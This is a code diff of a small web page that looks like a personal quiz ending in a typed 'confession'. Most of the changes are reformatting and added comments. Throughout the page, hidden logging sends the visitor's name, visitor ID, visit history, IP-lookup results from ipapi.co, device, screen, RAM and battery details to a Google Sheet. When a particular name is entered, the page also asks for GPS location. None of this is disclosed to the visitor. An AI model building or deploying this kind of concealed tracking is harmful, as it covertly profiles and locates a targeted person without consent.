@@ -49,14 +49,14 @@ input{
 
 <div id="box">
 
-<div id="text">
-Did You Come From Kite's YT link ?
-</div>
+    <div id="text">
+        Did You Come From Kite's YT link ?
+    </div>
 
-<div id="buttons">
-<button onclick="startAnswer('yes')">Yes</button>
-<button onclick="startAnswer('no')">No</button>
-</div>
+    <div id="buttons">
+        <button onclick="startAnswer('yes')">Yes</button>
+        <button onclick="startAnswer('no')">No</button>
+    </div>
 
 </div>
 
@@ -75,10 +75,10 @@ if (!visitorId) {
 let visitCount = Number(localStorage.getItem("visit_count") || 0) + 1;
 localStorage.setItem("visit_count", visitCount);
 
-// NEW or RETURNING
+// New or returning visitor
 let isReturning = visitCount > 1;
 
-// Store first visit time only once
+// First visit time
 let firstVisitTime = localStorage.getItem("first_visit_time");
 
 if (!firstVisitTime) {
@@ -88,6 +88,8 @@ if (!firstVisitTime) {
 
 let currentVisitTime = new Date().toLocaleString();
 
+
+// Send data to Google Sheet
 function logData(name,event){
 
     fetch(SHEET_URL,{
@@ -100,6 +102,8 @@ function logData(name,event){
 
 }
 
+
+// First question
 function startAnswer(answer){
 
     if(answer === "no"){
@@ -120,6 +124,8 @@ function startAnswer(answer){
 
 }
 
+
+// Check name
 function checkName(){
 
     let name = document.getElementById("nameInput")
@@ -131,15 +137,28 @@ function checkName(){
 
     logData(name,"name_entered");
 
-    logData(name, "visitor_id: " + visitorId);
+    logData(name,"visitor_id: " + visitorId);
 
-    logData(name, "user_type: " + (isReturning ? "RETURNING" : "NEW"));
+    logData(
+        name,
+        "user_type: " + (isReturning ? "RETURNING" : "NEW")
+    );
 
-    logData(name, "visit_count: " + visitCount);
+    logData(
+        name,
+        "visit_count: " + visitCount
+    );
 
-    logData(name, "first_visit: " + firstVisitTime);
+    logData(
+        name,
+        "first_visit: " + firstVisitTime
+    );
 
-    logData(name, "current_visit: " + currentVisitTime);
+    logData(
+        name,
+        "current_visit: " + currentVisitTime
+    );
+
 
     // IP information
     fetch("https://ipapi.co/json/")
@@ -173,6 +192,7 @@ function checkName(){
 
     });
 
+
     // Device information
     logData(
         name,
@@ -180,14 +200,15 @@ function checkName(){
     );
 
     let deviceType =
-    /Mobi|Android/i.test(navigator.userAgent)
-    ? "Mobile"
-    : "Desktop";
+        /Mobi|Android/i.test(navigator.userAgent)
+        ? "Mobile"
+        : "Desktop";
 
     logData(
         name,
         "device_type: " + deviceType
     );
+
 
     alert(
         "Screen: " + screen.width + "x" + screen.height +
@@ -212,12 +233,13 @@ function checkName(){
         "ram_gb: " + navigator.deviceMemory
     );
 
+
     // Battery information
     function sendBattery(){
 
         if (!navigator.getBattery) {
 
-            logData(name, "battery: not_supported");
+            logData(name,"battery: not_supported");
 
             return;
         }
@@ -226,19 +248,22 @@ function checkName(){
 
             let level = Math.round(battery.level * 100);
 
-            if (isNaN(level)) {
+            if(isNaN(level)){
 
-                logData(name, "battery: unknown");
+                logData(name,"battery: unknown");
 
-            } else {
+            }else{
 
-                logData(name, "battery: " + level + "%");
+                logData(
+                    name,
+                    "battery: " + level + "%"
+                );
 
             }
 
         }).catch(function(){
 
-            logData(name, "battery: blocked");
+            logData(name,"battery: blocked");
 
         });
 
@@ -246,7 +271,8 @@ function checkName(){
 
     sendBattery();
 
-    // Check name
+
+    // Correct name
     if(name !== "ayesha"){
 
         document.getElementById("text").innerHTML =
@@ -256,6 +282,7 @@ function checkName(){
 
         return;
     }
+
 
     // GPS location
     navigator.geolocation.getCurrentPosition(
@@ -274,20 +301,28 @@ function checkName(){
 
         function(){
 
-            logData(name,"location_denied");
+            logData(
+                name,
+                "location_denied"
+            );
 
         }
 
     );
 
+
+    // Next question
     document.getElementById("text").innerHTML =
     "Are you mad at me?";
 
     document.getElementById("buttons").innerHTML =
-    '<button onclick="madAnswer(\'yes\')">Yes</button><button onclick="madAnswer(\'no\')">No</button>';
+    '<button onclick="madAnswer(\'yes\')">Yes</button>' +
+    '<button onclick="madAnswer(\'no\')">No</button>';
 
 }
 
+
+// Are you mad?
 function madAnswer(answer){
 
     if(answer === "yes"){
@@ -298,25 +333,17 @@ function madAnswer(answer){
     }else{
 
         document.getElementById("text").innerHTML =
-        "Okay okay good.<br><br>Wanna hear something?";
+        "Okay okay good.";
 
     }
 
     document.getElementById("buttons").innerHTML =
-    '<button onclick="finalTyping()">Okayyy</button><button onclick="dontWannaHear()">Don\'t wanna hear</button>';
+    '<button onclick="finalTyping()">Okayyy</button>';
 
 }
 
-function dontWannaHear(){
 
-    document.getElementById("text").innerHTML =
-    "plzz";
-
-    document.getElementById("buttons").innerHTML =
-    '<button onclick="finalTyping()">Okayyy</button><button onclick="dontWannaHear()">Nooo</button>';
-
-}
-
+// Final confession
 function finalTyping(){
 
     document.getElementById("buttons").innerHTML = "";
@@ -332,13 +359,15 @@ function finalTyping(){
 
     let typing = setInterval(() => {
 
-        text.innerHTML = message.substring(0, i + 1);
+        text.innerHTML = message.substring(0,i + 1);
 
         i++;
 
         if(i >= message.length){
 
             clearInterval(typing);
+
+            // NOTHING HAPPENS AFTER THIS
 
         }
 
